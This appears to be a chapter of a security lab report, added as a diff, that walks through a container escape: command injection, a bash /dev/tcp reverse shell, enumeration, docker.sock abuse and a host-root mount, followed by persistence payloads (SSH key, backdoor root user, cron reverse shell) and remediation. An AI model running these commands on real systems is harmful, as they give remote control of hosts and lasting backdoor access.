@@ -1,0 +1,377 @@
+\chapter{The Full Attack Chain}
+
+\section{Overview of the Chain}
+
+The attack demonstrated in this project requires no CVE, no kernel exploit, and no specialized tooling beyond \texttt{curl} and \texttt{netcat}. It is made possible entirely by two misconfigurations that co-exist in the target environment: OS command injection in \texttt{app.py} due to unsanitized input passed to \texttt{os.popen()}, and \texttt{/var/run/docker.sock} bind-mounted into the container, granting any root process inside the container full control over the host Docker daemon.
+
+The complete attack chain proceeds as follows:
+
+\begin{lstlisting}
+Command Injection (HTTP GET)
+       |
+       v
+RCE as root inside container
+       |
+       v
+Reverse Shell (bash TCP redirect)
+       |
+       v
+Container Enumeration (confirm docker.sock present)
+       |
+       v
+docker.sock Abuse (CLI installed inside container)
+       |
+       v
+Privileged Container Spawned (host / mounted)
+       |
+       v
+Host Filesystem Write (escaped.txt on real host)
+\end{lstlisting}
+
+Each step is deterministic. There is no bruteforce, no timing dependency, and no guessing. The chain proceeds in a fixed sequence where each step produces the exact precondition required by the next. In a real engagement, the full chain can be completed in under five minutes.
+
+\vspace{0.3cm}
+
+\section{Step 1 -- Confirming RCE}
+
+Before investing in further exploitation, the attacker first verifies that command injection is functional and that the execution context is root. The confirmation request is:
+
+\begin{lstlisting}
+GET http://192.168.98.4:5000/ping?host=8.8.8.8%3Bid
+\end{lstlisting}
+
+A successful response body contains:
+
+\begin{lstlisting}
+uid=0(root) gid=0(root) groups=0(root)
+\end{lstlisting}
+
+The \texttt{attack.sh} automation script encodes this as a hard precondition:
+
+\begin{lstlisting}[language=bash]
+RESPONSE=$(curl -s --max-time 10 "${TARGET}/ping?host=8.8.8.8%3Bid")
+echo "$RESPONSE" | grep -q "uid=0" || exit 1
+\end{lstlisting}
+
+The script exits immediately if root execution is not confirmed, preventing downstream steps from producing misleading output. The docker socket is also verified before proceeding:
+
+\begin{lstlisting}[language=bash]
+curl -s "http://192.168.98.4:5000/ping?host=8.8.8.8%3Bls+-la+/var/run/docker.sock"
+# srw-rw---- 1 root 132 ... /var/run/docker.sock
+\end{lstlisting}
+
+Confirmation of both root execution and socket presence constitutes a fully green light for the remainder of the chain.
+
+\vspace{0.3cm}
+
+\section{Step 2 -- Establishing a Reverse Shell}
+
+\subsection{What a Reverse Shell Is}
+
+A reverse shell is a technique in which the target machine initiates the TCP connection back to the attacker, rather than the attacker connecting inbound to the target. This is necessary here because the container is behind NAT and has no directly reachable inbound port from VM2's perspective. The attacker opens a listener on a known port; the injected payload on the target connects outward to that port; the attacker receives an interactive shell session.
+
+This is in contrast to a bind shell, in which the target opens a listening port and waits for the attacker to connect. A bind shell is impractical in this topology because the container's IP (\texttt{172.17.0.x}) is not directly reachable from VM2 without routing through the host.
+
+\subsection{The Bash TCP Redirect Technique}
+
+The reverse shell payload is:
+
+\begin{lstlisting}[language=bash]
+bash -i >& /dev/tcp/192.168.98.5/4444 0>&1
+\end{lstlisting}
+
+Each component serves a specific purpose. \texttt{bash -i} starts an interactive bash session with a prompt and job control enabled. \texttt{/dev/tcp/host/port} is a bash built-in facility -- it is not a real filesystem path but a special construct that causes bash to ask the kernel to create a \texttt{SOCK\_STREAM} TCP socket and connect it to the specified host and port. \texttt{>\&} redirects both \texttt{stdout} and \texttt{stderr} to the file descriptor associated with the TCP socket. \texttt{0>\&1} redirects \texttt{stdin} from the same socket, completing the bidirectional I/O loop.
+
+No external binary is required. The entire payload executes using bash's built-in \texttt{/dev/tcp} support. At the kernel level, the sequence is:
+
+\begin{lstlisting}
+socket(AF_INET, SOCK_STREAM, 0)
+connect(sockfd, {192.168.98.5:4444})
+dup2(sockfd, STDIN_FILENO)
+dup2(sockfd, STDOUT_FILENO)
+dup2(sockfd, STDERR_FILENO)
+\end{lstlisting}
+
+The payload is URL-encoded for safe HTTP delivery:
+
+\begin{lstlisting}
+bash+-c+'bash+-i+>%26+/dev/tcp/192.168.98.5/4444+0>%261'
+\end{lstlisting}
+
+The full curl trigger command is:
+
+\begin{lstlisting}[language=bash]
+curl -s "http://192.168.98.4:5000/ping?host=8.8.8.8;bash+-c+\
+'bash+-i+>%26+/dev/tcp/192.168.98.5/4444+0>%261'"
+\end{lstlisting}
+
+\subsection{Netcat Listener Setup}
+
+The listener must be started on VM2 before the payload is sent. The command is:
+
+\begin{lstlisting}[language=bash]
+nc -lvnp 4444
+\end{lstlisting}
+
+The flags specify: \texttt{-l} (listen mode), \texttt{-v} (verbose output, shows connection received), \texttt{-n} (no DNS resolution, faster), \texttt{-p 4444} (bind to port 4444). In \texttt{attack.sh}, the listener is opened automatically in a new terminal window before the payload curl is dispatched.
+
+After the payload fires, the curl command will hang indefinitely. This is expected behavior: the Flask thread is blocked inside \texttt{os.popen().read()}, waiting for the shell process to exit. Since the reverse shell keeps the bash process alive, \texttt{os.popen()} never returns. The interactive session is available on the netcat listener, not in the curl output.
+
+\subsection{Shell Stabilization with PTY}
+
+The raw netcat shell lacks a pseudo-terminal (PTY). This causes several practical problems: pressing \texttt{Ctrl+C} terminates the entire netcat connection rather than the current foreground process; tab completion does not work; and programs that require a TTY (such as \texttt{sudo}, \texttt{vim}, or \texttt{su}) will refuse to start.
+
+Shell stabilization is performed by running the following sequence inside the reverse shell:
+
+\begin{lstlisting}[language=bash]
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+\end{lstlisting}
+
+Then, on the attacker's local terminal, background the netcat process and configure the local terminal to pass raw input:
+
+\begin{lstlisting}[language=bash]
+# Press Ctrl+Z to background nc
+stty raw -echo; fg
+# Press Enter twice
+\end{lstlisting}
+
+\texttt{pty.spawn()} allocates a pseudo-terminal and attaches bash to it, so the shell behaves identically to a normal interactive login session. \texttt{stty raw -echo} on the local terminal disables local line editing and stops echoing characters, so all keystrokes are forwarded raw to the remote shell over netcat. The result is a fully interactive shell with job control, arrow key history, and correct \texttt{Ctrl+C} behavior.
+
+\vspace{0.3cm}
+
+\section{Step 3 -- Enumerating the Container}
+
+Once the reverse shell is established, the attacker performs a structured enumeration of the container environment to confirm the execution context and identify the escape vector.
+
+First, identity and OS context are confirmed:
+
+\begin{lstlisting}[language=bash]
+id                     # uid=0(root) -- confirmed root
+hostname               # container hostname
+cat /etc/os-release    # Debian-based, apt-get available
+uname -a               # kernel version -- shared with host
+\end{lstlisting}
+
+Second, the container boundary is verified to ensure the attacker is not already on the host:
+
+\begin{lstlisting}[language=bash]
+cat /proc/1/cgroup     # contains docker/<container-id>
+ls /.dockerenv         # present in Docker containers
+cat /proc/self/mounts  # shows overlay filesystem and bind mounts
+\end{lstlisting}
+
+Third, the docker socket escape vector is located:
+
+\begin{lstlisting}[language=bash]
+ls -la /var/run/docker.sock
+# srw-rw---- 1 root 132 ... -- present and root-accessible
+find / -name docker.sock 2>/dev/null  # alternative discovery
+\end{lstlisting}
+
+Fourth, network topology is mapped:
+
+\begin{lstlisting}[language=bash]
+ip addr    # container IP: 172.17.0.x
+ip route   # default via docker0 gateway
+\end{lstlisting}
+
+Finally, the package manager is verified functional:
+
+\begin{lstlisting}[language=bash]
+which apt-get      # confirms package manager present
+apt-get update -qq # confirms internet and repo access
+\end{lstlisting}
+
+The three findings that unlock the next step are: \texttt{docker.sock} is present and accessible to \texttt{UID 0}; the process is running as root; and \texttt{apt-get} is functional. All three are confirmed here.
+
+\vspace{0.3cm}
+
+\section{Step 4 -- Finding and Abusing docker.sock}
+
+The socket file confirmed in Step 3 has the following permissions:
+
+\begin{lstlisting}
+srw-rw---- 1 root 132 ... /var/run/docker.sock
+\end{lstlisting}
+
+The \texttt{s} type character identifies it as a Unix domain socket. The owner is \texttt{root}, and the attacker's process runs as \texttt{UID 0}, so the permission check passes without requiring group membership.
+
+A live daemon connection is verified without requiring the Docker CLI binary, using \texttt{curl}'s Unix socket support:
+
+\begin{lstlisting}[language=bash]
+curl -s --unix-socket /var/run/docker.sock http://localhost/version
+\end{lstlisting}
+
+A successful response returns a JSON object containing the Docker daemon version, API version, and build information. This confirms that the socket bind-mount is live and the daemon is responding to API calls.
+
+All containers currently running on the host are enumerable via the API:
+
+\begin{lstlisting}[language=bash]
+curl -s --unix-socket /var/run/docker.sock \
+  http://localhost/containers/json | python3 -m json.tool
+\end{lstlisting}
+
+Access to the daemon API is unrestricted. There is no authentication token, certificate, or challenge required. A connection to the socket is equivalent to full administrative access to the Docker daemon. From this point, without any additional tools, the attacker can create new containers with arbitrary volume mounts, read environment variables from other running containers (which may contain credentials), stop or restart any container on the host, and read arbitrary host filesystem paths by mounting them into a new container.
+
+\vspace{0.3cm}
+
+\section{Step 5 -- Installing Docker CLI Inside the Container}
+
+While the raw HTTP API via \texttt{curl} is sufficient to complete the escape (as demonstrated in Section~\ref{sec:sockabuse}), the Docker CLI provides a more ergonomic interface for the escape command. The CLI is installed directly inside the compromised container:
+
+\begin{lstlisting}[language=bash]
+apt-get update -qq
+apt-get install -y docker.io
+\end{lstlisting}
+
+This succeeds because the container runs as \texttt{UID 0}, \texttt{apt-get} is present in the base image, and the base Debian package repositories are configured and reachable. The \texttt{docker.io} package provides the Docker CLI binary. The Docker daemon inside the package is not started and is not relevant -- only the CLI client is needed.
+
+After installation, the CLI is verified against the host daemon via the bind-mounted socket:
+
+\begin{lstlisting}[language=bash]
+docker -H unix:///var/run/docker.sock ps
+\end{lstlisting}
+
+A successful response lists all running containers on the host, confirming that the CLI is communicating with the host daemon through the bind-mounted socket. The \texttt{-H} flag explicitly specifies the socket path. Docker CLI defaults to this same path without the flag, but explicit specification removes any ambiguity for documentation and scripting purposes.
+
+If \texttt{apt-get} were unavailable (for example in a minimal or non-Debian base image), the escape could proceed using only the raw \texttt{curl} API calls shown in the previous section. The CLI installation step is a convenience, not a requirement.
+
+\vspace{0.3cm}
+
+\section{Step 6 -- Spawning a Privileged Container with Host Root Mounted}
+
+This step is the moment of escape. The attacker, operating inside the compromised container over the reverse shell, instructs the host Docker daemon to spawn a new container with the host root filesystem mounted inside it.
+
+\begin{figure}[h]
+\centering
+\vspace{3cm}
+\caption{Docker socket abuse: attacker's container instructs host daemon to mount host root into a new container}
+\end{figure}
+
+The escape command is:
+
+\begin{lstlisting}[language=bash]
+docker -H unix:///var/run/docker.sock run -d \
+  -v /:/hostfs --rm alpine \
+  chroot /hostfs sh -c 'echo pwned > /tmp/escaped.txt'
+\end{lstlisting}
+
+Each component is significant. \texttt{-H unix:///var/run/docker.sock} directs the CLI to communicate with the host daemon via the bind-mounted socket. \texttt{run -d} creates and starts a new container in detached mode. \texttt{-v /:/hostfs} bind-mounts the host root filesystem into the new container at \texttt{/hostfs} -- critically, this \texttt{/} refers to the \textit{host's} root, because it is the daemon (running on the host) that resolves the source path, not the attacker's container. \texttt{--rm} removes the new container automatically after the command completes. \texttt{alpine} is the base image -- minimal and likely already cached; if not, the daemon pulls it automatically. \texttt{chroot /hostfs sh -c 'echo pwned > /tmp/escaped.txt'} changes the process root to the host filesystem and executes the payload, writing the file to \texttt{/tmp/escaped.txt} on the actual host.
+
+At the kernel level, the sequence on the host side is:
+
+\begin{lstlisting}
+1. HTTP POST /containers/create received by dockerd (UID 0 on host)
+2. dockerd -> containerd -> runc
+3. runc: mount(MS_BIND, "/", container_rootfs + "/hostfs")
+          (host root bound into new container's mount namespace)
+4. New container process: chroot /hostfs
+                          execve sh -c 'echo pwned > /tmp/escaped.txt'
+5. File written to /tmp/escaped.txt in host's mount namespace
+\end{lstlisting}
+
+The attacker's original container never changes its namespace. It never calls \texttt{setns()} or \texttt{unshare()}. The escape is entirely daemon-mediated: the attacker sends an API instruction, and the daemon -- running in host namespaces with full capabilities -- performs the privileged operation on the attacker's behalf.
+
+\vspace{0.3cm}
+
+\section{Step 7 -- Writing to the Host Filesystem}
+
+The escape is verified by checking for the artifact file on VM1 from outside any container:
+
+\begin{lstlisting}[language=bash]
+cat /tmp/escaped.txt
+# pwned
+\end{lstlisting}
+
+The presence of this file on the real host filesystem proves that a process which started inside a container wrote data to the host. The container's mount namespace was bypassed not by breaking any isolation primitive, but by using the daemon API to create a new container that was intentionally given access to the host filesystem.
+
+The \texttt{detect.sh} script checks for this artifact as a first-order indicator of compromise:
+
+\begin{lstlisting}[language=bash]
+[ -f /tmp/escaped.txt ] && echo "HOST IS COMPROMISED"
+\end{lstlisting}
+
+The same mechanism that wrote the demonstration file can be used for persistent, high-impact actions on the host:
+
+\begin{lstlisting}[language=bash]
+# Add an SSH public key for persistent access
+chroot /hostfs sh -c 'echo "<pubkey>" >> /root/.ssh/authorized_keys'
+
+# Add a backdoor root user to /etc/passwd
+chroot /hostfs sh -c \
+  'echo "backdoor:x:0:0::/root:/bin/bash" >> /etc/passwd'
+
+# Install a cron-based reverse shell for persistence
+chroot /hostfs sh -c \
+  'echo "* * * * * root bash -i >& /dev/tcp/192.168.98.5/4444 0>&1" \
+  >> /etc/crontab'
+\end{lstlisting}
+
+Each of these operations is structurally identical to the proof-of-concept write. The host is fully compromised.
+
+\vspace{0.3cm}
+
+\section{Kernel-Level View of the Escape}
+
+\begin{figure}[h]
+\centering
+\vspace{3cm}
+\caption{Namespace boundary diagram: attacker container, host daemon, and new privileged container}
+\end{figure}
+
+The escape is most precisely understood in terms of Linux namespaces. The attacker's container operates within its own set of namespaces: a PID namespace that scopes process visibility, a mount namespace rooted on an OverlayFS layer, and a network namespace with address \texttt{172.17.0.x}. None of these namespaces are directly crossed or modified during the attack.
+
+The bind-mounted docker socket is a single socket inode that exists in both the host's mount namespace and the container's mount namespace simultaneously. When the attacker's process writes to this socket, it is performing a standard filesystem write from within the container's mount namespace. The kernel delivers the data to \texttt{dockerd}, which is a process running in the host's PID and mount namespaces. The socket is the channel through which namespace boundaries are traversed indirectly.
+
+The daemon, upon receiving the \texttt{/containers/create} API call with \texttt{-v /:/hostfs}, creates a new container whose mount namespace is constructed to include a bind-mount of the host's root filesystem. The new container's \texttt{/hostfs} path resolves to the host's \texttt{/} in the host's mount namespace. When the new container writes to \texttt{/hostfs/tmp/escaped.txt}, the file is created in the host's mount namespace at \texttt{/tmp/escaped.txt}.
+
+Table~\ref{tab:namespace_boundaries} summarizes which namespace boundaries were crossed and by what mechanism.
+
+\begin{table}[h]
+\centering
+\caption{Namespace Boundary Analysis}
+\label{tab:namespace_boundaries}
+\begin{tabular}{|l|l|l|}
+\hline
+\textbf{Boundary} & \textbf{Crossed?} & \textbf{Mechanism} \\
+\hline
+Attacker PID namespace & No & Daemon acts on attacker's behalf \\
+Attacker mount namespace & No & Socket fd traverses, not process \\
+Host mount namespace & Yes (by new container) & \texttt{-v /:/hostfs} bind mount \\
+Network namespace & No & TCP reverse shell uses veth/NAT \\
+\hline
+\end{tabular}
+\end{table}
+
+The cgroup limits, Linux capabilities, and seccomp profile applied to the attacker's original container are all irrelevant to this escape. None of these controls apply to operations that the daemon performs autonomously on the host after receiving an API instruction. The daemon itself operates with full capabilities, no seccomp profile, and no cgroup restrictions on its own process tree.
+
+\vspace{0.3cm}
+
+\section{Why This Is Not a Kernel Exploit}
+
+A kernel exploit is defined as an attack that abuses a bug in kernel code to gain privileges that the system configuration explicitly does not permit. Kernel exploits are tied to specific CVEs, require unpatched vulnerabilities, and are neutralized by kernel updates. Well-known examples include Dirty COW (CVE-2016-5195), which abused a race condition in the copy-on-write page fault handler, and the runc container escape (CVE-2019-5736), which exploited a file descriptor leak in the container runtime.
+
+This attack shares none of those characteristics. Every operation in the chain is behavior that the Docker daemon explicitly supports and that the system configuration explicitly permits. Mounting \texttt{docker.sock} into a container is a deliberate administrator action. The daemon accepting API calls over that socket is designed behavior. Creating a new container with \texttt{-v /:/hostfs} is a valid and documented API operation. Writing a file inside a bind-mounted host directory is the expected outcome of that operation. No kernel memory is corrupted, no race condition is triggered, and no unintended code path is exercised.
+
+\begin{table}[h]
+\centering
+\caption{Kernel Exploit vs. Misconfiguration Attack Comparison}
+\label{tab:exploit_comparison}
+\begin{tabular}{|l|l|l|}
+\hline
+\textbf{Property} & \textbf{Kernel Exploit} & \textbf{This Attack} \\
+\hline
+Requires CVE & Yes & No \\
+Kernel version dependent & Yes & No \\
+Fixed by kernel patch & Yes & No \\
+Fixed by config change & No & Yes (remove socket mount) \\
+Reliability & Varies & Deterministic \\
+Exploit development required & Yes & No \\
+\hline
+\end{tabular}
+\end{table}
+
+This distinction has a direct implication for remediation. A kernel exploit is fixed by applying a security patch. This attack is fixed by removing the \texttt{-v /var/run/docker.sock:/var/run/docker.sock} line from the container configuration. No patch, no CVE tracking, no kernel update is involved. The attack demonstrates that misconfiguration represents a more prevalent and more immediately actionable threat surface than kernel vulnerabilities in containerized environments.
+
+\vspace{0.5cm}
